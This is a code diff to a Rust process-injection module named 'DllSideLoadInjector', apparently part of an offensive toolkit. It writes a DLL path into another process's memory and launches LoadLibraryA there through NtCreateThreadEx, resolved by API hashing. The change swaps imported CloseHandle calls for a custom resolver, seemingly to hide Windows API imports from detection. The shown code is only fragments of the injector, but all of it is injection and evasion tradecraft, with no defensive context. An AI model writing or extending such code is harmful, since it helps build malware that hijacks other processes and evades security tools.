@@ -23,7 +23,6 @@ pub struct DllSideLoadInjector;
 #[cfg(windows)]
 impl Injector for DllSideLoadInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::handleapi::CloseHandle;
         use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
         use winapi::um::processthreadsapi::OpenProcess;
         use winapi::um::synchapi::WaitForSingleObject;
@@ -81,7 +80,7 @@ impl Injector for DllSideLoadInjector {
         }
         .ok_or_else(|| {
             cleanup();
-            unsafe { CloseHandle(h_proc) };
+            unsafe { pe_resolve::close_handle(h_proc) };
             anyhow!("kernel32 not found")
         })?;
 
@@ -93,7 +92,7 @@ impl Injector for DllSideLoadInjector {
         }
         .ok_or_else(|| {
             cleanup();
-            unsafe { CloseHandle(h_proc) };
+            unsafe { pe_resolve::close_handle(h_proc) };
             anyhow!("LoadLibraryA not found")
         })?;
 
@@ -101,7 +100,7 @@ impl Injector for DllSideLoadInjector {
             unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) }
                 .ok_or_else(|| {
                     cleanup();
-                    unsafe { CloseHandle(h_proc) };
+                    unsafe { pe_resolve::close_handle(h_proc) };
                     anyhow!("ntdll not found")
                 })?;
 
@@ -113,7 +112,7 @@ impl Injector for DllSideLoadInjector {
         }
         .ok_or_else(|| {
             cleanup();
-            unsafe { CloseHandle(h_proc) };
+            unsafe { pe_resolve::close_handle(h_proc) };
             anyhow!("NtCreateThreadEx not found")
         })?;
 
@@ -145,7 +144,7 @@ impl Injector for DllSideLoadInjector {
         };
         if remote_path.is_null() {
             cleanup();
-            unsafe { CloseHandle(h_proc) };
+            unsafe { pe_resolve::close_handle(h_proc) };
             return Err(anyhow!("DllSideLoad: VirtualAllocEx for path failed"));
         }
         let mut written = 0usize;
@@ -185,7 +184,7 @@ impl Injector for DllSideLoadInjector {
                     0,
                     winapi::um::winnt::MEM_RELEASE,
                 );
-                CloseHandle(h_proc);
+                pe_resolve::close_handle(h_proc);
             }
             return Err(anyhow!("DllSideLoad: NtCreateThreadEx failed: {status:#x}"));
         }
@@ -193,14 +192,14 @@ impl Injector for DllSideLoadInjector {
         // Wait for LoadLibraryA to complete, then clean up.
         unsafe {
             WaitForSingleObject(h_thread, INFINITE);
-            CloseHandle(h_thread);
+            pe_resolve::close_handle(h_thread);
             winapi::um::memoryapi::VirtualFreeEx(
                 h_proc,
                 remote_path,
                 0,
                 winapi::um::winnt::MEM_RELEASE,
             );
-            CloseHandle(h_proc);
+            pe_resolve::close_handle(h_proc);
         }
         cleanup();
 
